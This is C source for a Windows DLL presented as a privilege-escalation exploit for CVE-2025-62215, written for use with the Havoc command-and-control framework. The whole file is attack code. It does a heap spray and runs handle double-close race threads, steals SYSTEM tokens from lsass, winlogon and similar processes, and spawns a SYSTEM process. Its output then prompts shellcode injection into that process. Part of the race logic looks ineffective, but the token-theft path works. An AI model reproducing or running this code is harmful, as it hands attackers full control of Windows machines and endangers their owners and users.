/*
 * CVE-2025-62215 LPE Exploit - DLL for Havoc DllSpawn
 *
 * Output: WriteFile to stdout handle (no CRT stdio dependency).
 * Args:   lpvReserved = plain text (Havoc decodes b64 before passing).
 *
 * Build (static CRT, matches AutoPtT pattern):
 *   cl.exe /O2 /LD exploit_dll.cpp /Fe:cve_2025_62215.dll
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>

#pragma comment(lib, "advapi32.lib")

#ifdef __cplusplus
extern "C" {
#endif

/* ================================================================
 * Config
 * ================================================================ */
#define NUM_RACE_THREADS        8
#define RACE_ITERATIONS         1000
#define HEAP_CHUNKS             100
#define EXPLOIT_TIMEOUT_MS      5000
#define MAX_ATTEMPTS            3
#define DOUBLE_FREE_INTERVAL    10

static wchar_t g_spawnTarget[MAX_PATH] = L"notepad.exe";

/* ================================================================
 * Output - WriteFile to stdout, bypasses CRT completely
 * ================================================================ */
static HANDLE g_hOut = INVALID_HANDLE_VALUE;

static void InitOutput(void)
{
    g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
}

static void Out(const char* fmt, ...)
{
    if (g_hOut == NULL || g_hOut == INVALID_HANDLE_VALUE)
        return;

    char buf[2048];
    va_list ap;
    va_start(ap, fmt);
    int len = _vsnprintf(buf, sizeof(buf) - 1, fmt, ap);
    va_end(ap);

    if (len > 0) {
        buf[len] = 0;
        DWORD written;
        WriteFile(g_hOut, buf, (DWORD)len, &written, NULL);
    }
}

/* Also try reconnecting CRT stdout as fallback */
static void FixStdout(void)
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == NULL || hOut == INVALID_HANDLE_VALUE) return;

    int fd = _open_osfhandle((intptr_t)hOut, _O_TEXT);
    if (fd < 0) return;

    _dup2(fd, _fileno(stdout));
    setvbuf(stdout, NULL, _IONBF, 0);
}

/* ================================================================
 * Global state
 * ================================================================ */
static volatile LONG g_raceTriggered  = 0;
static volatile LONG g_exploitSuccess = 0;
static volatile LONG g_threadCount    = 0;
static HANDLE        g_systemToken    = NULL;

/* ================================================================
 * ntdll function pointers
 * ================================================================ */
typedef NTSTATUS (WINAPI *fn_NtCreateFile)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    PIO_STATUS_BLOCK, PLARGE_INTEGER,
    ULONG, ULONG, ULONG, ULONG, PVOID, ULONG
);
typedef NTSTATUS (WINAPI *fn_NtClose)(HANDLE);

static fn_NtCreateFile pNtCreateFile = NULL;
static fn_NtClose      pNtClose      = NULL;

/* ================================================================
 * Token checks
 * ================================================================ */
static BOOL IsTokenElevated(void)
{
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elev = {0};
    DWORD size = 0;
    BOOL result = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &size))
            result = elev.TokenIsElevated;
        CloseHandle(hToken);
    }
    return result;
}

static BOOL IsRunningAsSystem(void)
{
    HANDLE hToken = NULL;
    BOOL result = FALSE;
    DWORD size = 0;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    GetTokenInformation(hToken, TokenUser, NULL, 0, &size);
    if (size == 0) { CloseHandle(hToken); return FALSE; }

    TOKEN_USER* tu = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!tu) { CloseHandle(hToken); return FALSE; }

    if (GetTokenInformation(hToken, TokenUser, tu, size, &size)) {
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        PSID systemSid = NULL;
        if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                                     0, 0, 0, 0, 0, 0, 0, &systemSid)) {
            result = EqualSid(tu->User.Sid, systemSid);
            FreeSid(systemSid);
        }
    }

    HeapFree(GetProcessHeap(), 0, tu);
    CloseHandle(hToken);
    return result;
}

/* ================================================================
 * Process enumeration
 * ================================================================ */
static DWORD FindProcessByName(const wchar_t* name)
{
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(snap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}

/* ================================================================
 * Privilege helpers
 * ================================================================ */
static BOOL EnablePrivilege(const wchar_t* privName)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp = {0};

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    BOOL ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hToken);
    return ok;
}

/* ================================================================
 * Token stealing
 * ================================================================ */
static HANDLE StealTokenFromPid(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return NULL;

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProc,
                          TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE,
                          &hToken)) {
        CloseHandle(hProc);
        return NULL;
    }

    HANDLE hDup = NULL;
    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                     SecurityImpersonation, TokenImpersonation, &hDup);

    CloseHandle(hToken);
    CloseHandle(hProc);
    return hDup;
}

static BOOL ElevateViaTokenTheft(void)
{
    EnablePrivilege(L"SeDebugPrivilege");
    EnablePrivilege(L"SeImpersonatePrivilege");

    static const wchar_t* targets[] = {
        L"winlogon.exe", L"lsass.exe", L"services.exe", L"csrss.exe", NULL
    };

    for (int i = 0; targets[i]; i++) {
        DWORD pid = FindProcessByName(targets[i]);
        if (!pid) continue;

        Out("[*] Token theft: %S (PID %u)\n", targets[i], pid);
        HANDLE token = StealTokenFromPid(pid);
        if (!token) {
            Out("[!] Failed: error %u\n", GetLastError());
            continue;
        }

        if (SetThreadToken(NULL, token)) {
            Out("[+] SYSTEM token via %S!\n", targets[i]);
            g_systemToken = token;
            return TRUE;
        }

        Out("[!] SetThreadToken failed: %u\n", GetLastError());
        CloseHandle(token);
    }

    return FALSE;
}

/* ================================================================
 * Spawn process as SYSTEM
 * ================================================================ */
static DWORD SpawnAsSystem(const wchar_t* target)
{
    if (!g_systemToken) {
        Out("[!] No SYSTEM token\n");
        return 0;
    }

    HANDLE hPrimary = NULL;
    if (!DuplicateTokenEx(g_systemToken, MAXIMUM_ALLOWED, NULL,
                          SecurityIdentification, TokenPrimary, &hPrimary)) {
        Out("[!] DuplicateTokenEx failed: %u\n", GetLastError());
        return 0;
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.lpDesktop = (LPWSTR)L"WinSta0\\Default";

    wchar_t cmd[MAX_PATH];
    lstrcpynW(cmd, target, MAX_PATH);

    BOOL ok = CreateProcessAsUserW(
        hPrimary, NULL, cmd, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE | CREATE_SUSPENDED,
        NULL, NULL, &si, &pi
    );

    if (!ok) {
        Out("[!] CreateProcessAsUserW: %u\n", GetLastError());

        typedef BOOL (WINAPI *fn_CPWTW)(HANDLE, DWORD, LPCWSTR, LPWSTR,
                                        DWORD, LPVOID, LPCWSTR,
                                        LPSTARTUPINFOW, LPPROCESS_INFORMATION);
        HMODULE hAdv = GetModuleHandleA("advapi32.dll");
        fn_CPWTW pCPWTW = NULL;
        if (hAdv)
            pCPWTW = (fn_CPWTW)GetProcAddress(hAdv, "CreateProcessWithTokenW");

        if (pCPWTW) {
            ZeroMemory(&si, sizeof(si));
            ZeroMemory(&pi, sizeof(pi));
            si.cb = sizeof(si);
            si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
            lstrcpynW(cmd, target, MAX_PATH);

            ok = pCPWTW(g_systemToken, 0, NULL, cmd,
                        CREATE_NEW_CONSOLE | CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi);
        }

        if (!ok) {
            Out("[!] All spawn methods failed: %u\n", GetLastError());
            CloseHandle(hPrimary);
            return 0;
        }
    }

    DWORD pid = pi.dwProcessId;
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hPrimary);

    return pid;
}

/* ================================================================
 * ntdll init
 * ================================================================ */
static BOOL InitKernelFunctions(void)
{
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return FALSE;

    pNtCreateFile = (fn_NtCreateFile)GetProcAddress(h, "NtCreateFile");
    pNtClose      = (fn_NtClose)GetProcAddress(h, "NtClose");

    return (pNtCreateFile != NULL && pNtClose != NULL);
}

/* ================================================================
 * Heap spray
 * ================================================================ */
static PVOID  g_heapChunks[HEAP_CHUNKS];
static int    g_heapCount = 0;

static BOOL HeapSpray(void)
{
    g_heapCount = 0;
    for (int i = 0; i < HEAP_CHUNKS; i++) {
        g_heapChunks[i] = VirtualAlloc(NULL, 0x1000,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_READWRITE);
        if (g_heapChunks[i]) {
            memset(g_heapChunks[i], 0x41 + (i % 26), 0x1000);
            g_heapCount++;
        }
    }
    return g_heapCount > 0;
}

static void HeapCleanup(void)
{
    for (int i = 0; i < HEAP_CHUNKS; i++) {
        if (g_heapChunks[i]) {
            VirtualFree(g_heapChunks[i], 0, MEM_RELEASE);
            g_heapChunks[i] = NULL;
        }
    }
    g_heapCount = 0;
}

/* ================================================================
 * Race condition thread
 * ================================================================ */
static DWORD WINAPI RaceThread(LPVOID param)
{
    (void)param;
    InterlockedIncrement(&g_threadCount);

    HANDLE hObj = INVALID_HANDLE_VALUE;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK iosb;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    for (int i = 0; i < RACE_ITERATIONS; i++) {
        if (InterlockedCompareExchange(&g_raceTriggered, 0, 0))
            break;

        ZeroMemory(&iosb, sizeof(iosb));
        NTSTATUS st = pNtCreateFile(
            &hObj, GENERIC_ALL, &objAttr, &iosb,
            NULL, 0, 0, 0, 0, NULL, 0
        );

        if (st >= 0 && hObj != INVALID_HANDLE_VALUE) {
            pNtClose(hObj);
            Sleep(0);
            if (i % DOUBLE_FREE_INTERVAL == 0)
                pNtClose(hObj);
        }

        if (InterlockedCompareExchange(&g_exploitSuccess, 0, 0))
            break;
    }

    return 0;
}

/* ================================================================
 * Monitor thread
 * ================================================================ */
static DWORD WINAPI MonitorThread(LPVOID param)
{
    (void)param;

    for (int checks = 0; checks < 100; checks++) {
        Sleep(50);
        if (IsTokenElevated() || IsRunningAsSystem()) {
            InterlockedExchange(&g_raceTriggered, 1);
            InterlockedExchange(&g_exploitSuccess, 1);
            return 0;
        }
    }
    return 0;
}

/* ================================================================
 * Core exploit
 * ================================================================ */
static BOOL DoExploit(void)
{
    Out("[*] CVE-2025-62215 - Windows Kernel Race Condition LPE\n");
    Out("[*] Target: %S\n", g_spawnTarget);
    Out("\n");

    if (IsTokenElevated() || IsRunningAsSystem()) {
        Out("[+] Already elevated!\n");
        InterlockedExchange(&g_exploitSuccess, 1);
        goto post_exploit;
    }

    if (!InitKernelFunctions()) {
        Out("[!] ntdll resolve failed\n");
        return FALSE;
    }
    Out("[+] Kernel functions OK\n");

    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        Out("[*] Attempt %d/%d\n", attempt + 1, MAX_ATTEMPTS);

        InterlockedExchange(&g_raceTriggered, 0);
        InterlockedExchange(&g_exploitSuccess, 0);
        InterlockedExchange(&g_threadCount, 0);

        Out("[*] Heap spray...\n");
        if (!HeapSpray()) {
            Out("[!] Heap spray failed\n");
            continue;
        }
        Out("[+] Heap: %d chunks\n", g_heapCount);

        Out("[*] Race threads: %d\n", NUM_RACE_THREADS);

        HANDLE hMonitor = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);
        HANDLE hThreads[NUM_RACE_THREADS] = {0};

        for (int i = 0; i < NUM_RACE_THREADS; i++) {
            hThreads[i] = CreateThread(NULL, 0, RaceThread, NULL, 0, NULL);
            Sleep(1);
        }

        Out("[*] Waiting (%dms)...\n", EXPLOIT_TIMEOUT_MS);
        WaitForMultipleObjects(NUM_RACE_THREADS, hThreads, TRUE, EXPLOIT_TIMEOUT_MS);
        Sleep(500);

        for (int i = 0; i < NUM_RACE_THREADS; i++) {
            if (hThreads[i]) CloseHandle(hThreads[i]);
        }
        if (hMonitor) {
            WaitForSingleObject(hMonitor, 1000);
            CloseHandle(hMonitor);
        }

        HeapCleanup();

        if (InterlockedCompareExchange(&g_exploitSuccess, 0, 0)) {
            Out("[+] Kernel exploit OK (attempt %d)\n", attempt + 1);
            goto post_exploit;
        }

        Out("[!] Attempt %d failed\n", attempt + 1);
    }

    Out("[*] Kernel exploit missed, trying token theft...\n");
    if (ElevateViaTokenTheft()) {
        Out("[+] Token theft OK!\n");
        InterlockedExchange(&g_exploitSuccess, 1);
        goto post_exploit;
    }

    Out("[!] FAILED\n");
    return FALSE;

post_exploit:
    Out("\n");
    Out("[+] === POST-EXPLOITATION ===\n");

    if (!g_systemToken) {
        Out("[*] Stealing SYSTEM token...\n");
        if (!ElevateViaTokenTheft()) {
            Out("[!] Token theft failed\n");
            return FALSE;
        }
    }

    Out("[*] Spawning: %S\n", g_spawnTarget);
    DWORD pid = SpawnAsSystem(g_spawnTarget);
    if (pid) {
        Out("\n");
        Out("[+] ==================================\n");
        Out("[+]  SYSTEM process created!\n");
        Out("[+]  Process: %S\n", g_spawnTarget);
        Out("[+]  PID:     %u\n", pid);
        Out("[+] ==================================\n");
        Out("\n");
        Out("[*] Next: shinject %u x64 <listener>\n", pid);
        return TRUE;
    }

    Out("[!] Spawn failed\n");
    return FALSE;
}

/* ================================================================
 * Check mode
 * ================================================================ */
static void DoCheck(void)
{
    Out("[*] CVE-2025-62215 - Check\n\n");

    typedef LONG (WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if (hNt) {
        RtlGetVersionPtr fn =
            (RtlGetVersionPtr)GetProcAddress(hNt, "RtlGetVersion");
        if (fn) {
            RTL_OSVERSIONINFOW vi;
            ZeroMemory(&vi, sizeof(vi));
            vi.dwOSVersionInfoSize = sizeof(vi);
            if (fn(&vi) == 0) {
                Out("[*] OS: Windows %lu.%lu Build %lu\n",
                    vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
                Out(vi.dwMajorVersion == 10
                    ? "[+] Potentially vulnerable\n"
                    : "[!] May not be vulnerable\n");
            }
        }
    }

    Out(IsTokenElevated() ? "[+] Elevated\n" : "[*] Not elevated\n");
    Out(IsRunningAsSystem() ? "[+] SYSTEM\n" : "[*] Not SYSTEM\n");
    Out(InitKernelFunctions() ? "[+] Kernel funcs OK\n" : "[!] Kernel funcs FAIL\n");

    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    Out("[*] Arch: %s\n",
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86");

    Out("\n[*] Done\n");
}

/* ================================================================
 * Parse args
 * ================================================================ */
static void ParseArgs(const char* args)
{
    if (!args || !args[0]) return;
    while (*args == ' ' || *args == '\t') args++;

    if (strncmp(args, "run", 3) == 0) {
        const char* p = args + 3;
        while (*p == ' ' || *p == '\t') p++;
        if (*p && *p != '\r' && *p != '\n') {
            MultiByteToWideChar(CP_ACP, 0, p, -1, g_spawnTarget, MAX_PATH);
            int len = lstrlenW(g_spawnTarget);
            while (len > 0 && (g_spawnTarget[len-1] == L' ' ||
                               g_spawnTarget[len-1] == L'\r' ||
                               g_spawnTarget[len-1] == L'\n'))
                g_spawnTarget[--len] = 0;
        }
    }
}

/* ================================================================
 * DllMain
 * ================================================================ */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        /* Init output: raw WriteFile to stdout handle */
        InitOutput();

        /* Also try CRT stdout fix (may help on some configs) */
        FixStdout();

        /* Immediate test - raw WriteFile, no formatting */
        {
            const char* hello = "[lpe] DLL loaded OK\n";
            DWORD w;
            if (g_hOut != INVALID_HANDLE_VALUE && g_hOut != NULL)
                WriteFile(g_hOut, hello, lstrlenA(hello), &w, NULL);
        }

        Out("[lpe] stdout handle: %p\n", (void*)g_hOut);

        /* Read args */
        const char* rawArgs = NULL;
        if (lpvReserved != NULL) {
            rawArgs = (const char*)lpvReserved;
            if (rawArgs[0] == '\0')
                rawArgs = NULL;
        }

        Out("[lpe] args: %s\n", rawArgs ? rawArgs : "(none)");
        Out("\n");

        /* Dispatch */
        if (rawArgs && strncmp(rawArgs, "check", 5) == 0) {
            DoCheck();
        } else {
            ParseArgs(rawArgs);
            DoExploit();
        }

        Out("\n[lpe] Finished\n");
        fflush(stdout);
    }

    return TRUE;
}

/* ================================================================
 * StartW / Start - rundll32 / Phantom53
 * ================================================================ */
__declspec(dllexport)
void CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPWSTR cmd, int show)
{
    (void)hwnd; (void)hinst; (void)show;
    InitOutput();
    FixStdout();

    static char argsBuf[512] = {0};
    if (cmd && cmd[0])
        WideCharToMultiByte(CP_ACP, 0, cmd, -1, argsBuf, 511, NULL, NULL);

    Out("[lpe] StartW\n");
    if (argsBuf[0] && strncmp(argsBuf, "check", 5) == 0) {
        DoCheck();
    } else {
        ParseArgs(argsBuf[0] ? argsBuf : NULL);
        DoExploit();
    }
    Out("\n[lpe] Finished\n");
    fflush(stdout);
}

__declspec(dllexport)
void CALLBACK Start(HWND hwnd, HINSTANCE hinst, LPSTR cmd, int show)
{
    (void)hwnd; (void)hinst; (void)show;
    InitOutput();
    FixStdout();

    Out("[lpe] Start\n");
    if (cmd && cmd[0] && strncmp(cmd, "check", 5) == 0) {
        DoCheck();
    } else {
        ParseArgs(cmd);
        DoExploit();
    }
    Out("\n[lpe] Finished\n");
    fflush(stdout);
}

#ifdef __cplusplus
}
#endif
